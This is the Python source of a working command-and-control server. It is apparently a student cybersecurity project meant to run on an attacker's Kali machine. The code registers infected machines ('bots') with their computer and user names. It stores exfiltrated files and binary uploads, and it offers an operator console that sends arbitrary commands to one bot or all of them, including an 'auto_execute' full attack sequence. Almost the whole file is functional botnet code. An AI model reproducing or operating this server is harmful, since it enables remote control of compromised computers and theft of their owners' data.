"""
ENHANCED COMMAND & CONTROL (C2) SERVER
======================================
Advanced C2 server with multiple features:
- Real-time bot management and monitoring
- Command execution on infected machines
- Data exfiltration reception and storage
- Interactive command console
- Bot persistence management

Author: CADT Cyber Security Project
Date: November 28, 2025
Run on: Kali Linux (Attacker Machine)
"""

import socket
import threading
import json
import time
import os
from datetime import datetime
import base64

class EnhancedC2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.active_bots = {}  # Format: {bot_id: {'socket': socket, 'info': dict, 'last_seen': timestamp}}
        self.bot_counter = 0
        self.server_running = True
        
        # Create data directories
        self.create_directories()
        
    def create_directories(self):
        """Create organized directories for C2 operations"""
        directories = ['bots', 'exfiltrated_data', 'logs', 'commands']
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
    
    def log_event(self, message, level="INFO"):
        """Log server events with timestamps"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] [{level}] {message}"
        print(log_message)
        
        # Write to log file
        with open("logs/c2_server.log", "a") as log_file:
            log_file.write(log_message + "\n")
    
    def handle_bot_connection(self, client_socket, client_address):
        """
        Handle individual bot connections with enhanced capabilities
        Supports multiple command types and data exfiltration
        """
        bot_id = f"BOT_{self.bot_counter:04d}"
        self.bot_counter += 1
        
        self.log_event(f"New bot connection: {bot_id} from {client_address[0]}:{client_address[1]}")
        
        try:
            # Receive initial handshake from bot
            initial_data = client_socket.recv(4096).decode('utf-8')
            bot_info = json.loads(initial_data)
            
            # Register bot in active list
            self.active_bots[bot_id] = {
                'socket': client_socket,
                'info': bot_info,
                'address': client_address,
                'last_seen': time.time(),
                'status': 'ACTIVE'
            }
            
            self.log_event(f"Bot {bot_id} registered: {bot_info.get('computer_name', 'Unknown')} - {bot_info.get('username', 'Unknown')}")
            
            # Save bot information to file
            bot_file = f"bots/{bot_id}.json"
            with open(bot_file, 'w') as f:
                json.dump(bot_info, f, indent=4)
            
            # Send welcome command
            welcome_message = {
                "command": "status",
                "parameters": "Welcome to C2 server. Awaiting commands.",
                "timestamp": time.time()
            }
            client_socket.send(json.dumps(welcome_message).encode())
            
            # Main command loop for this bot
            while self.server_running:
                try:
                    # Check for data from bot
                    client_socket.settimeout(2.0)  # Non-blocking receive
                    
                    data = client_socket.recv(16384)  # Larger buffer for file transfers
                    if not data:
                        break
                    
                    # Process received data
                    self.process_bot_data(bot_id, data)
                    
                    # Update last seen
                    self.active_bots[bot_id]['last_seen'] = time.time()
                    
                except socket.timeout:
                    # No data received, continue
                    continue
                except Exception as e:
                    self.log_event(f"Error handling bot {bot_id}: {e}", "ERROR")
                    break
                    
        except Exception as e:
            self.log_event(f"Failed to handle bot connection: {e}", "ERROR")
        finally:
            # Clean up bot connection
            if bot_id in self.active_bots:
                self.active_bots[bot_id]['status'] = 'DISCONNECTED'
                self.log_event(f"Bot {bot_id} disconnected")
            client_socket.close()
    
    def process_bot_data(self, bot_id, data):
        """
        Process different types of data received from bots:
        - Status updates
        - Exfiltrated files
        - Command results
        """
        try:
            # Try to parse as JSON first (structured data)
            decoded_data = data.decode('utf-8')
            message = json.loads(decoded_data)
            
            message_type = message.get('type', 'unknown')
            
            if message_type == 'status':
                self.log_event(f"Bot {bot_id} status: {message.get('data', 'No data')}")
                
            elif message_type == 'exfiltration':
                # Save exfiltrated data
                filename = f"exfiltrated_data/{bot_id}_{int(time.time())}.txt"
                exfil_data = message.get('data', '')
                
                # Handle base64 encoded file data
                if message.get('encoding') == 'base64':
                    file_data = base64.b64decode(exfil_data)
                    with open(filename, 'wb') as f:
                        f.write(file_data)
                    self.log_event(f"Bot {bot_id} exfiltrated file: {filename}", "EXFILTRATION")
                else:
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(exfil_data)
                    self.log_event(f"Bot {bot_id} exfiltrated data: {filename}", "EXFILTRATION")
                
            elif message_type == 'command_result':
                result = message.get('result', 'No result')
                self.log_event(f"Bot {bot_id} command result: {result}")
                
                # Save command result
                result_file = f"commands/{bot_id}_result_{int(time.time())}.txt"
                with open(result_file, 'w') as f:
                    f.write(str(result))
                    
        except (json.JSONDecodeError, UnicodeDecodeError):
            # Handle binary data (file uploads)
            filename = f"exfiltrated_data/{bot_id}_binary_{int(time.time())}.bin"
            with open(filename, 'wb') as f:
                f.write(data)
            self.log_event(f"Bot {bot_id} uploaded binary file: {filename} ({len(data)} bytes)", "EXFILTRATION")
    
    def send_command_to_bot(self, bot_id, command, parameters=""):
        """Send commands to specific bot"""
        if bot_id not in self.active_bots or self.active_bots[bot_id]['status'] != 'ACTIVE':
            self.log_event(f"Cannot send command to {bot_id}: Bot not active", "ERROR")
            return False
        
        try:
            command_message = {
                "command": command,
                "parameters": parameters,
                "timestamp": time.time()
            }
            
            bot_socket = self.active_bots[bot_id]['socket']
            bot_socket.send(json.dumps(command_message).encode())
            self.log_event(f"Sent command to {bot_id}: {command} {parameters}")
            return True
            
        except Exception as e:
            self.log_event(f"Failed to send command to {bot_id}: {e}", "ERROR")
            return False
    
    def broadcast_command(self, command, parameters=""):
        """Send command to all active bots"""
        self.log_event(f"Broadcasting command to all bots: {command}")
        results = {}
        
        for bot_id in list(self.active_bots.keys()):
            if self.active_bots[bot_id]['status'] == 'ACTIVE':
                success = self.send_command_to_bot(bot_id, command, parameters)
                results[bot_id] = "Sent" if success else "Failed"
        
        return results
    
    def list_bots(self):
        """Display all connected bots"""
        current_time = time.time()
        print("\n" + "="*60)
        print("ACTIVE BOTS")
        print("="*60)
        
        if not self.active_bots:
            print("No active bots connected")
            return
        
        for bot_id, bot_info in self.active_bots.items():
            last_seen = current_time - bot_info['last_seen']
            status = bot_info['status']
            computer_name = bot_info['info'].get('computer_name', 'Unknown')
            username = bot_info['info'].get('username', 'Unknown')
            
            print(f"{bot_id}: {computer_name} ({username})")
            print(f"  Status: {status}, Last Seen: {last_seen:.1f}s ago")
            print(f"  IP: {bot_info['address'][0]}:{bot_info['address'][1]}")
            print()
    
    def cleanup_inactive_bots(self):
        """Remove bots that haven't been seen in a while"""
        current_time = time.time()
        inactive_threshold = 300  # 5 minutes
        
        inactive_bots = []
        for bot_id, bot_info in self.active_bots.items():
            if current_time - bot_info['last_seen'] > inactive_threshold:
                inactive_bots.append(bot_id)
        
        for bot_id in inactive_bots:
            self.log_event(f"Removing inactive bot: {bot_id}")
            del self.active_bots[bot_id]
    
    def interactive_console(self):
        """Interactive command console for C2 operator"""
        print("\n" + "="*60)
        print("ENHANCED C2 SERVER - INTERACTIVE CONSOLE")
        print("="*60)
        print("Available commands:")
        print("  list              - Show connected bots")
        print("  broadcast <cmd>   - Send command to all bots")
        print("  command <bot> <cmd> - Send command to specific bot")
        print("  cleanup           - Remove inactive bots")
        print("  status            - Show server status")
        print("  exit              - Shutdown server")
        print()
        
        while self.server_running:
            try:
                user_input = input("C2> ").strip()
                
                if user_input == "exit":
                    self.shutdown()
                    break
                    
                elif user_input == "list":
                    self.list_bots()
                    
                elif user_input == "cleanup":
                    self.cleanup_inactive_bots()
                    print("Cleaned up inactive bots")
                    
                elif user_input == "status":
                    print(f"Server running on {self.host}:{self.port}")
                    print(f"Active bots: {len([b for b in self.active_bots.values() if b['status'] == 'ACTIVE'])}")
                    print(f"Total connections: {self.bot_counter}")
                    
                elif user_input.startswith("broadcast "):
                    # Send the typed command as the actual command field to bots
                    command = user_input[10:]
                    if command:
                        results = self.broadcast_command(command, "")
                        print(f"Broadcast results: {results}")
                    else:
                        print("Usage: broadcast <command>")

                elif user_input == "autoexecute":
                    # Broadcast a special command that tells bots to run full attack sequence
                    print("Broadcasting auto_execute to all bots...")
                    results = self.broadcast_command("auto_execute", "")
                    print(f"Autoexecute results: {results}")
                        
                elif user_input.startswith("command "):
                    parts = user_input[8:].split(" ", 1)
                    if len(parts) == 2:
                        bot_id, command = parts
                        if self.send_command_to_bot(bot_id, "execute", command):
                            print(f"Command sent to {bot_id}")
                        else:
                            print(f"Failed to send command to {bot_id}")
                    else:
                        print("Usage: command <bot_id> <command>")
                        
                else:
                    print("Unknown command. Type 'help' for available commands.")
                    
            except KeyboardInterrupt:
                self.shutdown()
                break
            except Exception as e:
                print(f"Console error: {e}")
    
    def start_server(self):
        """Start the enhanced C2 server"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(10)  # Increased backlog
            server_socket.settimeout(1.0)  # Allow periodic checks
            
            self.log_event(f"Enhanced C2 Server started on {self.host}:{self.port}")
            self.log_event("Waiting for bot connections...")
            
            # Start console in separate thread
            console_thread = threading.Thread(target=self.interactive_console, daemon=True)
            console_thread.start()
            
            # Main server loop
            while self.server_running:
                try:
                    client_socket, client_address = server_socket.accept()
                    
                    # Handle each bot in separate thread
                    bot_thread = threading.Thread(
                        target=self.handle_bot_connection, 
                        args=(client_socket, client_address),
                        daemon=True
                    )
                    bot_thread.start()
                    
                except socket.timeout:
                    # Timeout for accept, check if server should shutdown
                    continue
                except Exception as e:
                    if self.server_running:
                        self.log_event(f"Server accept error: {e}", "ERROR")
                    
        except Exception as e:
            self.log_event(f"Failed to start server: {e}", "ERROR")
        finally:
            server_socket.close()
            self.log_event("C2 Server shutdown complete")
    
    def shutdown(self):
        """Gracefully shutdown the C2 server"""
        self.log_event("Initiating server shutdown...")
        self.server_running = False
        
        # Close all bot connections
        for bot_id, bot_info in self.active_bots.items():
            try:
                bot_info['socket'].close()
            except:
                pass
        
        self.active_bots.clear()

if __name__ == "__main__":
    # You can customize host and port here
    c2_server = EnhancedC2Server(host='0.0.0.0', port=4444)
    c2_server.start_server()
